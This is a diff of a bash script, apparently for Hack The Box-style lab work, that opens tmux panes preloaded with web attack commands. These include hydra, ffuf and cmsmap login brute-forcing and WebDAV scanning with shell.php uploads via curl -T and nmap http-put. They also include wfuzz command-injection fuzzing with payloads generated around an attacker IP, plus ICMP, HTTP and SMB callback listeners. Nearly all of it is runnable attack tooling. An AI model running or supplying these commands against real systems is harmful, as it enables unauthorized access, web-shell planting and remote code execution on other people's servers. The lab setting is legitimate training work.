+tmux send-keys -t PT:6.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
+tmux send-keys -t PT:6.3 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:6.3 "cadaver $ip"
+tmux send-keys -t PT:6.4 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:6.4 "curl -T shell.txt -u login:password http://$ip"
+tmux send-keys -t PT:6.5 "# upload file to webDAV folder" Enter
+tmux send-keys -t PT:6.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
+cd $folderProject
+
+
+# Attivazione della modalità interattiva
+tmux -2 attach-session -t PT
+;;
+
+
+
+
+
         5)
 ######################
 ######################
-###################### 	>>>>>>>>>>>>>>>>> WEB APP: AUTHN-BYPASS
+###################### 	>>>>>>>>>>>>>>>>> Service AuthN bypass: ssh, ftp, smtp,  etc
 ######################
 ######################
-open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
+echo "work in progress for this section."
+;;
+
+
+
+
+        6)
+######################
+######################
+###################### 	>>>>>>>>>>>>>>>>> WEB Service AuthN bypass: brute force, command injection, webDAV, etc
+######################
+######################
+# XXX open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
 # Creazione di una sessione Tmux con attivazione VPN
 tmux new-session -d -s PT -n "any other business"
 tmux send-keys "ip=$ip" Enter
 tmux send-keys "site=$site" Enter
 tmux send-keys "domain=$domain" Enter
 
-# OPEN-VPN
-#tmux new-window -t PT:1 -n 'openVPN'
-#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter
-
-# WEB PUT HTTP
-cd $folderProjectWebAuthN
-# Layout
-tmux new-window -t PT:1 -n 'WEB PUT HTTP'
-tmux split-window -v -t PT:1.0  
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:1.0 "# exploit PUT method attack" Enter
-tmux send-keys -t PT:1.0 "nmap -p 80 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php' $ip # HTTP PUT Example" 
-cd $folderProject
-
-
-
-# WEB Bruteforce AuthN
-cd $folderProjectWebAuthN
-# Layout
-tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
-tmux split-window -v -t PT:2.0
-tmux split-window -v -t PT:2.1
-tmux split-window -v -t PT:2.2
-tmux select-pane -t "2.1"
-tmux split-window -h -t "2.1"
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:2.0 "# find valid dictionary for bruteforce" Enter
-tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
-tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
-tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
-tmux send-keys -t PT:2.2 "# bruteforce POST authN with BurpSuite saved request" Enter
-tmux send-keys -t PT:2.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
-tmux send-keys -t PT:2.3 "# bruteforce BasicAuth authN" Enter
-tmux send-keys -t PT:2.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
-tmux send-keys -t PT:2.4 "# bruteforce CMS" Enter
-tmux send-keys -t PT:2.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
-cd $folderProject
-
-
 # WEB Command Injection
 cd $folderProjectWebAuthN
 # Layout
-tmux new-window -t PT:3 -n 'WEB Command Injection'
-tmux split-window -v -t PT:3.0
-tmux split-window -v -t PT:3.1
-tmux split-window -v -t PT:3.2
-tmux select-pane -t "3.1"
-tmux split-window -h -t "3.1"
-tmux split-window -h -t "3.1"
-tmux select-pane -t "3.4"
-tmux split-window -h -t "3.4"
-
-
+tmux new-window -t PT:1 -n 'WEB Command Injection'
+tmux split-window -v -t PT:1.0
+tmux split-window -v -t PT:1.1
+tmux split-window -v -t PT:1.2
+tmux select-pane -t "1.1"
+tmux split-window -h -t "1.1"
+tmux split-window -h -t "1.1"
+tmux select-pane -t "1.4"
+tmux split-window -h -t "1.4"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:3.0 "# automate command injection scan" Enter
-tmux send-keys -t PT:3.0 "sudo uniscan -u http://$site -qweds"
-tmux send-keys -t PT:3.1 "# activate listener ICMP" Enter
-tmux send-keys -t PT:3.1 "sudo tcpdump -i tun0 icmp"
-tmux send-keys -t PT:3.2 "# activate listener HTTP" Enter
-tmux send-keys -t PT:3.2 "python3 -m http.server 80"
-tmux send-keys -t PT:3.3 "# activate listener SMB" Enter
-tmux send-keys -t PT:3.3 "impacket-smbserver -smb2support htb \$(pwd)"
+tmux send-keys -t PT:1.0 "# automate command injection scan" Enter
+tmux send-keys -t PT:1.0 "sudo uniscan -u http://$site -qweds"
+tmux send-keys -t PT:1.1 "# activate listener ICMP" Enter
+tmux send-keys -t PT:1.1 "sudo tcpdump -i tun0 icmp"
+tmux send-keys -t PT:1.2 "# activate listener HTTP" Enter
+tmux send-keys -t PT:1.2 "python3 -m http.server 80"
+tmux send-keys -t PT:1.3 "# activate listener SMB" Enter
+tmux send-keys -t PT:1.3 "impacket-smbserver -smb2support htb \$(pwd)"
 #Preparo il file per le command injection
 cd $folderProjectEngine
-#tmux send-keys -t PT:3.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
+#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
 python ./cmdGenerator.py $attackerIP cmdlist.txt
 mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
 cd $folderProjectWebAuthN
-tmux send-keys -t PT:3.4"# command injection automation (GET)" Enter
-tmux send-keys -t PT:3.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
-tmux send-keys -t PT:3.5 "# command injection automation (POST)" Enter
-tmux send-keys -t PT:3.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
+tmux send-keys -t PT:1.4"# command injection automation (GET)" Enter
+tmux send-keys -t PT:1.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
+tmux send-keys -t PT:1.5 "# command injection automation (POST)" Enter
+tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
 cd $folderProject
-
-
-
-
-# WEB DAV
-cd $folderProjectWebFingerprint
-# Layout
-tmux new-window -t PT:4 -n 'WEB DAV'
-tmux split-window -v -t PT:4.0
-tmux split-window -v -t PT:4.1
-tmux split-window -v -t PT:4.2
-tmux split-window -v -t PT:4.3
-tmux select-pane -t "4.3"
-tmux split-window -h -t "4.3"
-tmux split-window -h -t "4.3"
-
-# Esecuzione dei comandi nelle sottofinestre
- 
-tmux send-keys -t PT:4.0 "# Bruteforce attack to get Target Site Folders" Enter
-tmux send-keys -t PT:4.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
-tmux send-keys -t PT:4.1 "# Bruteforce attack to get credentials to specific folder" Enter
-tmux send-keys -t PT:4.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
-tmux send-keys -t PT:4.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
-tmux send-keys -t PT:4.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
-tmux send-keys -t PT:4.3 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:4.3 "cadaver $ip"
-tmux send-keys -t PT:4.4 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:4.4 "curl -T shell.txt -u login:password http://$ip"
-tmux send-keys -t PT:4.5 "# upload file to webDAV folder" Enter
-tmux send-keys -t PT:4.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
-cd $folderProject
-
 
 
 # Attivazione della modalità interattiva
